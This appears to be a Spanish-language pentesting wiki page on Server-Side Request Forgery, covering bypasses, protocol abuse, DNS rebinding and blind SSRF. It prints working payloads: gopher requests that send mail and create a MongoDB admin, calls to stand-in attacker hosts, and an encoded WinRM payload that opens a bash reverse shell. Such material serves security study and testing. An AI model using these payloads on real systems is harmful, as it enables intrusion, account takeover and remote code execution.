# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Una vulnerabilidad de **Server-side Request Forgery (SSRF)** ocurre cuando un atacante manipula una **aplicación del lado del servidor** para que realice **HTTP requests** a un dominio de su elección. Esta vulnerabilidad expone al servidor a solicitudes externas arbitrarias dirigidas por el atacante.

## Capturar SSRF

Lo primero que debes hacer es capturar una interacción SSRF generada por ti. Para capturar una interacción HTTP o DNS puedes usar herramientas como:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Evasión de dominios en lista blanca

Normalmente encontrarás que el SSRF solo funciona en **ciertos dominios o URLs en lista blanca**. En la página siguiente tienes una **compilación de técnicas para intentar bypassear esa lista blanca**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass vía Open Redirect

Si el servidor está correctamente protegido podrías **bypassear todas las restricciones explotando un Open Redirect dentro de la página web**. Debido a que la página permitirá **SSRF al mismo dominio** y probablemente **seguirá redirects**, puedes explotar el **Open Redirect para hacer que el servidor acceda a cualquier recurso interno**.\
Lee más aquí: [https://portswigger.net/web-security/ssrf]

## Protocolos

- **file://**
- El esquema de URL `file://` se menciona, apuntando directamente a `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- El esquema de URL DICT se describe como utilizado para acceder a definiciones o listas de palabras vía el protocolo DICT. Un ejemplo muestra una URL construida que apunta a una palabra específica, base de datos y número de entrada, así como un caso de un script PHP que podría usarse indebidamente para conectar con un servidor DICT usando credenciales proporcionadas por el atacante: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identificado como un protocolo para transferencia segura de archivos sobre secure shell, se proporciona un ejemplo que muestra cómo un script PHP podría ser explotado para conectar con un servidor SFTP malicioso: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, que opera sobre UDP, se menciona con un ejemplo de un script PHP diseñado para enviar una solicitud a un servidor TFTP. Se realiza una petición TFTP a 'generic.com' en el puerto '12346' por el archivo 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Este segmento cubre el Lightweight Directory Access Protocol, enfatizando su uso para gestionar y acceder a servicios de directorio distribuidos sobre redes IP. Interactúa con un servidor LDAP en localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Se describe un método para explotar vulnerabilidades SSRF y así interactuar con servicios SMTP en localhost, incluyendo pasos para revelar nombres de dominio internos y acciones de investigación adicionales basadas en esa información.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Si el SSRF se ejecuta con **curl**, curl tiene una característica llamada [**URL globbing**](https://everything.curl.dev/cmdline/globbing) que podría ser útil para bypass WAFs. Por ejemplo, en este [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) puedes encontrar este ejemplo de un **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Se describe la capacidad del protocolo Gopher para especificar IP, port y bytes para la comunicación con servidores, junto con herramientas como Gopherus y remote-method-guesser para crear payloads. Se ilustran dos usos distintos:

### Gopher://

Usando este protocolo puedes especificar las **IP, port y bytes** que quieres que el servidor **envíe**. Entonces, básicamente puedes explotar un SSRF para **comunicarte con cualquier TCP server** (pero necesitas saber cómo hablar con el servicio primero).\
Afortunadamente, puedes usar [Gopherus](https://github.com/tarunkant/Gopherus) para crear payloads para varios servicios. Además, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) puede usarse para crear _gopher_ payloads para servicios _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Crear usuario con username=admin, password=admin123 y permiso=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF vía cabecera Referrer y otros

El software de analítica en servidores suele registrar la cabecera Referrer para rastrear enlaces entrantes, una práctica que expone inadvertidamente a las aplicaciones a vulnerabilidades de Server-Side Request Forgery (SSRF). Esto se debe a que dicho software puede visitar URLs externas mencionadas en la cabecera Referrer para analizar el contenido del sitio de referencia. Para descubrir estas vulnerabilidades, se recomienda el plugin de Burp Suite "**Collaborator Everywhere**", aprovechando la forma en que las herramientas de analítica procesan la cabecera Referer para identificar superficies de ataque SSRF potenciales.

## SSRF vía datos SNI desde certificado

Una mala configuración que podría permitir la conexión a cualquier backend mediante una configuración sencilla se ilustra con un ejemplo de configuración de Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
En esta configuración, el valor del campo Server Name Indication (SNI) se utiliza directamente como la dirección del backend. Esta configuración expone una vulnerabilidad a Server-Side Request Forgery (SSRF), que puede explotarse simplemente especificando la dirección IP o el nombre de dominio deseado en el campo SNI. A continuación se muestra un ejemplo de explotación para forzar una conexión a un backend arbitrario, como `internal.host.com`, usando el comando `openssl`:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF vía TLS AIA CA Issuers (Java mTLS)

Algunas pilas TLS descargarán automáticamente CAs intermedias faltantes usando la URI **Authority Information Access (AIA) → CA Issuers** dentro del certificado del par. En **Java**, habilitar `-Dcom.sun.security.enableAIAcaIssuers=true` al ejecutar un servicio mTLS hace que el servidor desreferencie URIs controladas por el atacante desde el certificado cliente **durante el handshake**, antes de que se ejecute cualquier lógica HTTP.

- **Requisitos**: mTLS habilitado, recuperación AIA de Java habilitada, el atacante puede presentar un certificado cliente con una URI AIA CA Issuers manipulada.
- **Disparo de SSRF** (ejemplo Java 21):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
La salida de depuración certpath de Java muestra `CertStore URI:http://localhost:8080`, y `nc` captura la petición HTTP con el `User-Agent` controlable desde `-Dhttp.agent`, demostrando SSRF durante la validación del certificado.
- **DoS vía file://**: configurar AIA CA Issuers a `file:///dev/urandom` en hosts tipo Unix hace que Java lo trate como un CertStore y lea bytes aleatorios sin límite, manteniendo un núcleo de CPU ocupado y bloqueando conexiones posteriores incluso después de que el cliente se desconecte.

## SSRF vía preprocesadores CSS

LESS es un preprocesador CSS popular que añade variables, mixins, funciones y la potente directiva `@import`. Durante la compilación, el motor LESS **obtendrá (fetch) los recursos referenciados en declaraciones `@import`** e incrustará ("inline") sus contenidos en el CSS resultante cuando se usa la opción `(inline)`.

Consulta cómo explotarlo en:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Puede valer la pena intentar una carga útil como: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Generación de PDFs

Si la página web está creando automáticamente un PDF con información que hayas proporcionado, puedes **insertar algo de JS que será ejecutado por el creador de PDF** en sí (el servidor) mientras crea el PDF y podrás abusar de un SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## De SSRF a DoS

Crea varias sesiones e intenta descargar archivos pesados explotando el SSRF desde las sesiones.

## Funciones PHP para SSRF

Consulta la siguiente página para funciones vulnerables de PHP e incluso Wordpress:

{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirección a Gopher

Para algunas explotaciones puede que necesites **enviar una respuesta de redirección** (posiblemente para usar un protocolo diferente como gopher). Aquí tienes distintos códigos python para responder con una redirección:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxies mal configurados para SSRF

Trucos [**de esta publicación**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Código vulnerable de proxy en Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permite usar **`@`** como carácter inicial, lo que permite hacer que el **nombre de host inicial sea el nombre de usuario** e inyectar uno nuevo. Petición de ataque:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Código vulnerable:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Se descubrió que es posible **iniciar la ruta** de una solicitud con el carácter **`;`**, lo que permite usar luego **`@`** e inyectar un nuevo host al que acceder. Petición de ataque:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Servidor web integrado de PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Código PHP vulnerable</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
PHP permite el uso del **carácter `*` antes de una barra en el path** de la URL; sin embargo, tiene otras limitaciones: solo puede usarse para el pathname raíz `/` y los puntos `.` no están permitidos antes de la primera barra, por lo que es necesario usar, por ejemplo, una dotless-hex encoded IP address:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Si tienes **problemas** para **exfiltrar contenido desde una IP local** debido a **CORS/SOP**, **DNS Rebidding** puede usarse para eludir esa limitación:


{{#ref}}
../cors-bypass.md
{{#endref}}

### DNS Rebidding automatizado

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) es una herramienta para realizar ataques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Incluye los componentes necesarios para reasignar la dirección IP asociada al nombre DNS del servidor atacante a la IP de la máquina objetivo y para servir payloads de ataque que exploten software vulnerable en la máquina objetivo.

También revisa el **servidor público en** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requisitos:

- **SSRF**
- **Outbound TLS sessions**
- **Servicios en puertos locales**

Ataque:

1. Pide al usuario/bot que **acceda** a un **dominio** controlado por el **attacker**
2. El **TTL** del **DNS** es **0** seg (por lo que la víctima volverá a comprobar la IP del dominio pronto)
3. Se crea una **conexión TLS** entre la víctima y el dominio del atacante. El atacante introduce el **payload dentro** del **Session ID o Session Ticket**.
4. El **dominio** iniciará un **bucle infinito** de redirecciones contra **sí mismo**. El objetivo de esto es hacer que el usuario/bot acceda al dominio hasta que realice **de nuevo** una **consulta DNS** del dominio.
5. En la consulta DNS se proporciona ahora una dirección **IP privada** (127.0.0.1, por ejemplo)
6. El usuario/bot intentará **restablecer la conexión TLS** y para ello **enviará** el **Session** ID/Ticket ID (donde estaba contenido el **payload** del atacante). Así que felicidades: lograste que el **usuario/bot se ataque a sí mismo**.

Ten en cuenta que durante este ataque, si quieres atacar localhost:11211 (_memcache_) necesitas hacer que la víctima establezca la conexión inicial con www.attacker.com:11211 (el **puerto debe ser siempre el mismo**).\
Para **realizar este ataque puedes usar la herramienta**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Para **más información** echa un vistazo a la charla donde se explica este ataque: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La diferencia entre un blind SSRF y uno no blind es que en el blind no puedes ver la respuesta de la petición SSRF. Entonces, es más difícil de explotar porque solo podrás aprovechar vulnerabilidades ya conocidas.

### Time based SSRF

**Comprobando el tiempo** de las respuestas del servidor puede ser **posible saber si un recurso existe o no** (tal vez tarda más acceder a un recurso existente que a uno que no existe)

### De blind a abuso completo usando códigos de estado

Según este [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), algunos blind SSRF pueden ocurrir porque, incluso si la URL objetivo responde con un código de estado 200 (como los metadata de AWS), estos datos no están correctamente formateados y por tanto la app podría negarse a mostrarlos.

Sin embargo, se ha descubierto que enviando respuestas de redirección con códigos entre 305 y 309 en el SSRF, puede ser posible hacer que la aplicación **siga estas redirecciones mientras entra en un modo de error** que ya no comprobará el formato de los datos y podría simplemente imprimirlos.

El servidor python usado para explotar esto es el siguiente:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Pasos:**
- Primero un 302 hace que la app empiece a seguir.
- Luego recibe 305 → 306 → 307 → 308 → 309 → 310.
- Tras el quinto código extraño el PoC finalmente devuelve 302 → 169.254.169.254 → 200 OK.

**¿Qué pasa dentro del objetivo:**
- libcurl sí sigue 305–310; simplemente normaliza códigos desconocidos a “follow.”
- Tras N redirecciones extrañas (≥ 5 aquí) el wrapper de la aplicación decide “algo va mal” y cambia a un modo de error pensado para debugging.
- En ese modo hace dump de toda la cadena de redirecciones más el body final de vuelta al caller externo.
- Resultado: el attacker ve cada header + el metadata JSON, misión cumplida.

Ten en cuenta que esto es interesante para leak status codes que no podías leak antes (como un 200). Sin embargo, si de alguna forma también pudieras seleccionar el código de estado de la respuesta (imagina que puedes decidir que el AWS metadata responda con un código 500), **podría haber algunos códigos de estado que directamente leak el contenido de la respuesta.**

### HTML-to-PDF renderers as blind SSRF gadgets

Bibliotecas como **TCPDF** (y wrappers como **spipu/html2pdf**) automáticamente fetch any URLs presentes en HTML controlado por el attacker mientras renderizan un PDF. Cada atributo `<img>` o `<link rel="stylesheet">` se resuelve server-side vía cURL, `getimagesize()`, o `file_get_contents()`, así que puedes forzar al PDF worker a sondear hosts internos aunque no se refleje ninguna respuesta HTTP hacia ti.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 realiza varios intentos de recuperación por cada recurso `<img>`, por lo que una sola payload puede generar múltiples solicitudes (útil para escaneos de puertos basados en temporización).
- html2pdf copia el comportamiento de TCPDF para `<img>` y añade la obtención de CSS dentro de `Css::extractStyle()`, que simplemente llama a `file_get_contents($href)` después de una comprobación superficial del esquema. Abúsa de ello para alcanzar servicios loopback, rangos RFC1918 o endpoints de metadatos de la nube.
- Combina esta primitiva SSRF con los HTML-to-PDF path traversal tricks para leak tanto respuestas HTTP internas como archivos locales renderizados en el PDF.

Los hardeners deberían eliminar las URLs externas antes de renderizar o aislar el renderer en un sandbox de red; hasta entonces, trata a los generadores de PDF como blind SSRF proxies.

## Explotación SSRF en entornos cloud

Si encuentras una vulnerabilidad SSRF en una máquina que corre dentro de un entorno cloud podrías obtener información interesante sobre el entorno cloud e incluso credenciales:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Plataformas vulnerables a SSRF

Varias plataformas conocidas contienen o han contenido vulnerabilidades SSRF; consúltalas en:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Herramientas

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Herramienta para detectar y explotar vulnerabilidades SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Entrada en el blog sobre Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Esta herramienta genera payloads Gopher para:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Entrada del blog sobre uso de SSRF](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ es un escáner de vulnerabilidades _Java RMI_ que soporta operaciones de ataque para la mayoría de las vulnerabilidades comunes de _Java RMI_. La mayoría de las operaciones disponibles soportan la opción `--ssrf`, para generar un payload _SSRF_ para la operación solicitada. Junto con la opción `--gopher`, se pueden generar directamente payloads _gopher_ listos para usar.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy es un servidor proxy HTTP multihilo diseñado para tunelizar tráfico HTTP de clientes a través de servidores HTTP vulnerables a Server-Side Request Forgery (SSRF).

### Para practicar


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Referencias

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
